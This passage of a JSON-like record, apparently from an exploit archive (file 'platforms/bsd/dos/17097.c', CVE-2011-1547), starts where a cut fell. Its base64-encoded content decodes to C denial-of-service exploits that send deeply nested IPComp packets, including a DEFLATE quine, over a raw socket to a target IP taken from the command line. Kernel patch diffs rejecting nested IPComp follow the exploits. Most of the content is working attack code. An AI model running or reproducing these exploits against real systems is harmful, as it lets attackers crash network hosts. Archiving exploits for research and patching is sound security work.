hNQVhfUEFDS0VUX1NJWkUpOw0KICAgICpvdXQgICAgICAgICAgICAgICAgPSBpcGNvbXA7DQogICAgaXBjb21wLT5jb21wX254dCAgICA9IG54dDsNCiAgICBpcGNvbXAtPmNvbXBfY3BpICAgID0gaHRvbnMoSVBDT01QX0RFRkxBVEUpOw0KICAgIGlwY29tcC0+Y29tcF9mbGFncyAgPSAwOw0KDQogICAgLy8gQ29tcHJlc3MgcGFja2V0IHBheWxvYWQuDQogICAgenN0cmVhbS56YWxsb2MgICAgICA9IFpfTlVMTDsNCiAgICB6c3RyZWFtLnpmcmVlICAgICAgID0gWl9OVUxMOw0KICAgIHpzdHJlYW0ub3BhcXVlICAgICAgPSBaX05VTEw7DQoNCiAgICBpZiAoZGVmbGF0ZUluaXQyKCZ6c3RyZWFtLA0KICAgICAgICAgICAgICAgICAgICAgbGV2ZWwsDQogICAgICAgICAgICAgICAgICAgICBaX0RFRkxBVEVELA0KICAgICAgICAgICAgICAgICAgICAgLTEyLA0KICAgICAgICAgICAgICAgICAgICAgTUFYX01FTV9MRVZFTCwNCiAgICAgICAgICAgICAgICAgICAgIFpfREVGQVVMVF9TVFJBVEVHWSkgIT0gWl9PSykgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBmYWlsZWQgdG8gaW5pdGlhbGl6ZSB6bGliIGxpYnJhcnlcbiIpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KDQogICAgenN0cmVhbS5hdmFpbF9pbiAgICA9IHNpemU7DQogICAgenN0cmVhbS5uZXh0X2luICAgICA9IGRhdGE7DQogICAgenN0cmVhbS5hdmFpbF9vdXQgICA9IE1BWF9QQUNLRVRfU0laRSAtIHNpemVvZihzdHJ1Y3QgaXBjb21wKTsNCiAgICB6c3RyZWFtLm5leHRfb3V0ICAgID0gaXBjb21wLT5jb21wX2RhdGE7DQoNCiAgICBpZiAoZGVmbGF0ZSgmenN0cmVhbSwgWl9GSU5JU0gpICE9IFpfU1RSRUFNX0VORCkgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBkZWZsYXRlKCkgZmFpbGVkIHRvIGNyZWF0ZSBjb21wcmVzc2VkIHBheWxvYWQsICVzXG4iLCB6c3RyZWFtLm1zZyk7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICBpZiAoZGVmbGF0ZUVuZCgmenN0cmVhbSkgIT0gWl9PSykgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBkZWZsYXRlRW5kKCkgcmV0dXJuZWQgZmFpbHVyZSwgJXNcbiIsIHpzdHJlYW0ubXNnKTsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIC8vIENhbGN1bGF0ZSBzaXplLg0KICAgICpsZW5ndGggICAgPSAoTUFYX1BBQ0tFVF9TSVpFIC0gc2l6ZW9mKHN0cnVjdCBpcGNvbXApKSAtIHpzdHJlYW0uYXZhaWxfb3V0Ow0KICAgIGlwY29tcCAgICAgPSByZWFsbG9jKGlwY29tcCwgKmxlbmd0aCk7DQoNCiAgICBmcmVlKGRhdGEpOw0KDQogICAgcmV0dXJuIHRydWU7DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikNCnsNCiAgICBpbnQgICAgICAgICAgICAgICAgIHM7DQogICAgc3RydWN0IHNvY2thZGRyX2luICBzaW4gICAgPSB7MH07DQogICAgc3RydWN0IGlwY29tcCAgICAgICppcGNvbXAgPSBtYWxsb2MoMCk7DQogICAgc2l6ZV90ICAgICAgICAgICAgICBsZW5ndGggPSAwOw0KICAgIHVuc2lnbmVkICAgICAgICAgICAgZGVwdGggID0gMDsNCg0KICAgIC8vIE5lc3QgYW4gaXBjb21wIHBhY2tldCBkZWVwbHkgd2l0aG91dCBjb21wcmVzc2lvbiwgdGhpcyBhbGxvd3MgdXMgdG8NCiAgICAvLyBjcmVhdGUgbWF4aW11bSByZWR1bmRhbmN5Lg0KICAgIGZvciAoZGVwdGggPSAwOyBkZXB0aCA8IE1BWF9FTkNBUF9ERVBUSDsgZGVwdGgrKykgew0KICAgICAgICBpZiAoaXBjb21wX2VuY2Fwc3VsYXRlX2RhdGEoaXBjb21wLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGVuZ3RoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSVBQUk9UT19DT01QLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJmlwY29tcCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICZsZW5ndGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBaX05PX0NPTVBSRVNTSU9OKSAhPSB0cnVlKSB7DQogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBmYWlsZWQgdG8gZW5jYXBzdWxhdGUgZGF0YVxuIik7DQogICAgICAgICAgICByZXR1cm4gMTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vIENyZWF0ZSBhIGZpbmFsIG91dGVyIHBhY2tldCB3aXRoIGJlc3QgY29tcHJlc3Npb24sIHdoaWNoIHNob3VsZCBub3cNCiAgICAvLyBjb21wcmVzcyB3ZWxsIGR1ZSB0byBaX05PX0NPTVBSRVNTSU9OIHVzZWQgaW4gaW5uZXIgcGF5bG9hZHMuDQogICAgaWYgKGlwY29tcF9lbmNhcHN1bGF0ZV9kYXRhKGlwY29tcCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGVuZ3RoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJUFBST1RPX0NPTVAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICZpcGNvbXAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICZsZW5ndGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFpfQkVTVF9DT01QUkVTU0lPTikgIT0gdHJ1ZSkgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBmYWlsZWQgdG8gZW5jYXBzdWxhdGUgZGF0YVxuIik7DQogICAgICAgIHJldHVybiAxOw0KICAgIH0NCg0KICAgIGZwcmludGYoc3Rkb3V0LCAiaW5mbzogY3JlYXRlZCAldSBuZXN0ZWQgaXBjb21wIHBheWxvYWQsICV1IGJ5dGVzXG4iLCBkZXB0aCwgbGVuZ3RoKTsNCg0KICAgIHNpbi5zaW5fZmFtaWx5ICAgICAgPSBBRl9JTkVUOw0KICAgIHNpbi5zaW5fcG9ydCAgICAgICAgPSBodG9ucygwKTsNCiAgICBzaW4uc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKGFyZ3ZbMV0pOw0KDQogICAgaWYgKChzID0gc29ja2V0KFBGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX0NPTVApKSA8IDApIHsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJlcnJvcjogZmFpbGVkIHRvIGNyZWF0ZSBzb2NrZXQsICVtXG4iKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfQ0KDQogICAgaWYgKHNlbmR0byhzLA0KICAgICAgICAgICAgICAgaXBjb21wLA0KICAgICAgICAgICAgICAgbGVuZ3RoLA0KICAgICAgICAgICAgICAgTVNHX05PU0lHTkFMLA0KICAgICAgICAgICAgICAgKGNvbnN0IHN0cnVjdCBzb2NrYWRkciAqKSgmc2luKSwNCiAgICAgICAgICAgICAgIHNpemVvZihzaW4pKSAhPSBsZW5ndGgpIHsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJlcnJvcjogc2VuZCgpIHJldHVybmVkIGZhaWx1cmUsICVtXG4iKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfQ0KDQogICAgZnByaW50ZihzdGRvdXQsICJpbmZvOiBzdWNjZXNzLCBwYWNrZXQgc2VudCB0byAlc1xuIiwgYXJndlsxXSk7DQoNCiAgICBmcmVlKGlwY29tcCk7DQoNCiAgICByZXR1cm4gMDsNCn0NCi0tLS0tLS0tLS0tLS0tIG5leHQgcGFydCAtLS0tLS0tLS0tLS0tLQ0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pcC5oPg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8emxpYi5oPg0KI2luY2x1ZGUgPGFsbG9jYS5oPg0KI2luY2x1ZGUgPHN0ZGJvb2wuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCg0KLy8NCi8vIE5lc3RlZCBJUENvbXAgRW5jYXBzdWxhdGlvbiB3aXRoIERFRkxBVEUgTFo3NyBSRkMxOTUxIFF1aW5lLg0KLy8NCi8vIFRoZSB0ZWNobmlxdWUgdXNlZCB0byBnZW5lcmF0ZSB0aGlzIHBheWxvYWQgaXMgZG9jdW1lbnRlZCBoZXJlOg0KLy8NCi8vICBodHRwOi8vcmVzZWFyY2guc3d0Y2guY29tLzIwMTAvMDMvemlwLWZpbGVzLWFsbC13YXktZG93bi5odG1sDQovLw0KLy8gIC0tIFRhdmlzIE9ybWFuZHkgPHRhdmlzbyBhdCBjbXB4Y2hnOGIuY29tPiwgTWFyY2ggMjAxMQ0KLy8NCi8vIFNwZWNpYWwgdGhhbmtzIHRvIHJzYyBhbmQgTWF0dGhldyBEZW1wc2t5Lg0KLy8NCg0KZW51bSB7DQogICAgSVBDT01QX09VSSAgICAgICAgICA9IDEsDQogICAgSVBDT01QX0RFRkxBVEUgICAgICA9IDIsDQogICAgSVBDT01QX0xaUyAgICAgICAgICA9IDMsDQogICAgSVBDT01QX01BWCwNCn07DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikNCnsNCiAgICBpbnQgICAgICAgICAgICAgICAgIHM7DQogICAgc3RydWN0IHNvY2thZGRyX2luICBzaW4gICAgPSB7MH07DQoNCiAgICBzdHJ1Y3QgX19hdHRyaWJ1dGVfXygocGFja2VkKSkgew0KICAgICAgICB1aW50OF90ICAgICBjb21wX254dDsgICAgICAgLy8gTmV4dCBIZWFkZXINCiAgICAgICAgdWludDhfdCAgICAgY29tcF9mbGFnczsgICAgIC8vIFJlc2VydmVkLCBtdXN0IGJlIHplcm8NCiAgICAgICAgdWludDE2X3QgICAgY29tcF9jcGk7ICAgICAgIC8vIENvbXByZXNzaW9uIHBhcmFtZXRlciBpbmRleA0KICAgICAgICB1aW50OF90ICAgICBjb21wX2RhdGFbMTgwXTsgLy8gUGF5bG9hZA0KICAgIH0gaXBjb21wID0gew0KICAgICAgICAgICAgLmNvbXBfbnh0ICAgICAgID0gSVBQUk9UT19DT01QLA0KICAgICAgICAgICAgLmNvbXBfZmxhZ3MgICAgID0gMCwNCiAgICAgICAgICAgIC5jb21wX2NwaSAgICAgICA9IGh0b25zKElQQ09NUF9ERUZMQVRFKSwNCiAgICAgICAgICAgIC5jb21wX2RhdGEgICAgICA9IHsNCiAgICAgICAgICAgICAgICAweGNhLCAweDYxLCAweDYwLCAweDYwLCAweDAyLCAweDAwLCAweDBhLCAweDAwLCAweGY1LCAweGZmLA0KICAgICAgICAgICAgICAgIDB4Y2EsIDB4NjEsIDB4NjAsIDB4NjAsIDB4MDIsIDB4MDAsIDB4MGEsIDB4MDAsIDB4ZjUsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHgwMiwgMHhiMywgMHhjMCwgMHgyYywgMHgwMCwgMHgwMCwgMHgwNSwgMHgwMCwgMHhmYSwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDAyLCAweGIzLCAweGMwLCAweDJjLCAweDAwLCAweDAwLCAweDA1LCAweDAwLCAweGZhLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4MDAsIDB4MDUsIDB4MDAsIDB4ZmEsIDB4ZmYsIDB4MDAsIDB4MTQsIDB4MDAsIDB4ZWIsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHgwMiwgMHhiMywgMHhjMCwgMHgyYywgMHgwMCwgMHgwMCwgMHgwNSwgMHgwMCwgMHhmYSwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDAwLCAweDA1LCAweDAwLCAweGZhLCAweGZmLCAweDAwLCAweDE0LCAweDAwLCAweGViLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4NDIsIDB4ODgsIDB4MjEsIDB4YzQsIDB4MDAsIDB4MDAsIDB4MTQsIDB4MDAsIDB4ZWIsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHg0MiwgMHg4OCwgMHgyMSwgMHhjNCwgMHgwMCwgMHgwMCwgMHgxNCwgMHgwMCwgMHhlYiwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDQyLCAweDg4LCAweDIxLCAweGM0LCAweDAwLCAweDAwLCAweDE0LCAweDAwLCAweGViLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4NDIsIDB4ODgsIDB4MjEsIDB4YzQsIDB4MDAsIDB4MDAsIDB4MTQsIDB4MDAsIDB4ZWIsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHg0MiwgMHg4OCwgMHgyMSwgMHhjNCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHhmZiwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDAwLCAweDAwLCAweDAwLCAweGZmLCAweGZmLCAweDAwLCAweDBmLCAweDAwLCAweGYwLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4NDIsIDB4ODgsIDB4MjEsIDB4YzQsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4ZmYsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHgwMCwgMHgwMCwgMHgwMCwgMHhmZiwgMHhmZiwgMHgwMCwgMHgwZiwgMHgwMCwgMHhmMCwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDgyLCAweDcyLCAweDYxLCAweDVjLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweGZmLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4MDEsIDB4MDAsIDB4MDAsIDB4ZmYsIDB4ZmYsIDB4ODIsIDB4NzIsIDB4NjEsIDB4NWMsIDB4MDAsDQogICAgICAgICAgICAgICAgMHgwMCwgMHgwMCwgMHgwMCwgMHhmZiwgMHhmZiwgMHgwMSwgMHgwMCwgMHgwMCwgMHhmZiwgMHhmZg0KICAgICAgICAgICAgfQ0KICAgIH07DQoNCg0KICAgIHNpbi5zaW5fZmFtaWx5ICAgICAgPSBBRl9JTkVUOw0KICAgIHNpbi5zaW5fcG9ydCAgICAgICAgPSBodG9ucygwKTsNCiAgICBzaW4uc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKGFyZ3ZbMV0pOw0KDQogICAgaWYgKChzID0gc29ja2V0KFBGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX0NPTVApKSA8IDApIHsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJlcnJvcjogZmFpbGVkIHRvIGNyZWF0ZSBzb2NrZXQsICVtXG4iKTsNCiAgICAgICAgcmV0dXJuIDE7DQogICAgfQ0KDQogICAgaWYgKHNlbmR0byhzLA0KICAgICAgICAgICAgICAgJmlwY29tcCwNCiAgICAgICAgICAgICAgIHNpemVvZihpcGNvbXApLA0KICAgICAgICAgICAgICAgTVNHX05PU0lHTkFMLA0KICAgICAgICAgICAgICAgKGNvbnN0IHN0cnVjdCBzb2NrYWRkciAqKSgmc2luKSwNCiAgICAgICAgICAgICAgIHNpemVvZihzaW4pKSAhPSBzaXplb2YoaXBjb21wKSkgew0KICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImVycm9yOiBzZW5kKCkgcmV0dXJuZWQgZmFpbHVyZSwgJW1cbiIpOw0KICAgICAgICByZXR1cm4gMTsNCiAgICB9DQoNCiAgICBmcHJpbnRmKHN0ZG91dCwgImluZm86IHN1Y2Nlc3MsIHBhY2tldCBzZW50IHRvICVzXG4iLCBhcmd2WzFdKTsNCg0KICAgIHJldHVybiAwOw0KfQ0KLS0tLS0tLS0tLS0tLS0gbmV4dCBwYXJ0IC0tLS0tLS0tLS0tLS0tDQpJbmRleDogc3lzL25ldGlwc2VjL3hmb3JtX2lwY29tcC5jDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpSQ1MgZmlsZTogL2N2c3Jvb3Qvc3JjL3N5cy9uZXRpcHNlYy94Zm9ybV9pcGNvbXAuYyx2DQpyZXRyaWV2aW5nIHJldmlzaW9uIDEuMjUNCmRpZmYgLXUgLXUgLXAgLXIxLjI1IHhmb3JtX2lwY29tcC5jDQotLS0gc3lzL25ldGlwc2VjL3hmb3JtX2lwY29tcC5jCTI0IEZlYiAyMDExIDIwOjAzOjQxIC0wMDAwCTEuMjUNCisrKyBzeXMvbmV0aXBzZWMveGZvcm1faXBjb21wLmMJMjkgTWFyIDIwMTEgMTk6MjQ6MDQgLTAwMDANCkBAIC0zMjYsNiArMzI2LDE0IEBAIGlwY29tcF9pbnB1dF9jYihzdHJ1Y3QgY3J5cHRvcCAqY3JwKQ0KIAkvKiBLZWVwIHRoZSBuZXh0IHByb3RvY29sIGZpZWxkICovDQogCWFkZHIgPSAodWludDhfdCopIG10b2QobSwgc3RydWN0IGlwICopICsgc2tpcDsNCiAJbnByb3RvID0gKChzdHJ1Y3QgaXBjb21wICopIGFkZHIpLT5jb21wX254dDsNCisJaWYgKG5wcm90byA9PSBJUFBST1RPX0lQQ09NUCB8fCBucHJvdG8gPT0gSVBQUk9UT19BSCB8fCBucHJvdG8gPT0gSVBQUk9UT19FU1ApIHsNCisJCUlQQ09NUF9TVEFUSU5DKElQQ09NUF9TVEFUX0hEUk9QUyk7DQorCQlEUFJJTlRGKCgiaXBjb21wX2lucHV0X2NiOiBuZXN0ZWQgaXBjb21wLCBJUENBICVzLyUwOGx4XG4iLA0KKwkJCSBpcHNlY19hZGRyZXNzKCZzYXYtPnNhaC0+c2FpZHguZHN0KSwNCisJCQkgKHVfbG9uZykgbnRvaGwoc2F2LT5zcGkpKSk7DQorCQllcnJvciA9IEVJTlZBTDsNCisJCWdvdG8gYmFkOw0KKwl9DQogDQogCS8qIFJlbW92ZSB0aGUgSVBDT01QIGhlYWRlciAqLw0KIAllcnJvciA9IG1fc3RyaXBoZHIobSwgc2tpcCwgaGxlbik7DQotLS0tLS0tLS0tLS0tLSBuZXh0IHBhcnQgLS0tLS0tLS0tLS0tLS0NCkluZGV4OiBzeXMvbmV0aW5ldDYvaXBjb21wX2lucHV0LmMNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NClJDUyBmaWxlOiAvY3Zzcm9vdC9zcmMvc3lzL25ldGluZXQ2L2lwY29tcF9pbnB1dC5jLHYNCnJldHJpZXZpbmcgcmV2aXNpb24gMS4zNg0KZGlmZiAtdSAtdSAtcCAtcjEuMzYgaXBjb21wX2lucHV0LmMNCi0tLSBzeXMvbmV0aW5ldDYvaXBjb21wX2lucHV0LmMJNSBNYXkgMjAwOCAxMzo0MTozMCAtMDAwMAkxLjM2DQorKysgc3lzL25ldGluZXQ2L2lwY29tcF9pbnB1dC5jCTI5IE1hciAyMDExIDE5OjE5OjAwIC0wMDAwDQpAQCAtMTQ4LDYgKzE0OCwxMyBAQCBpcGNvbXA0X2lucHV0KG0sIHZhX2FsaXN0KQ0KIAlpcGNvbXAgPSBtdG9kKG1kLCBzdHJ1Y3QgaXBjb21wICopOw0KIAlpcCA9IG10b2QobSwgc3RydWN0IGlwICopOw0KIAlueHQgPSBpcGNvbXAtPmNvbXBfbnh0Ow0KKwlpZiAobnh0ID09IElQUFJPVE9fSVBDT01QIHx8IG54dCA9PSBJUFBST1RPX0FIIHx8IG54dCA9PSBJUFBST1RPX0VTUCkgew0KKwkJLyogbmVzdGVkIGlwY29tcCAtIHBvc3NpYmxlIGF0dGFjaywgbm90IGxpa2VseSB1c2VmdWwgKi8NCisJCWlwc2VjbG9nKChMT0dfREVCVUcsICJJUHY0IElQQ29tcCBpbnB1dDogbmVzdGVkIGlwY29tcCAiDQorCQkgICAgIihiYWlsaW5nKVxuIikpOw0KKwkJSVBTRUNfU1RBVElOQyhJUFNFQ19TVEFUX0lOX0lOVkFMKTsNCisJCWdvdG8gZmFpbDsNCisJfQ0KIAlobGVuID0gaXAtPmlwX2hsIDw8IDI7DQogDQogCWNwaSA9IG50b2hzKGlwY29tcC0+Y29tcF9jcGkpOw==", 
    "filename": "platforms/bsd/dos/17097.c", 
    "id": "17097", 
    "cves": [
        "CVE-2011-1547"
    ]
}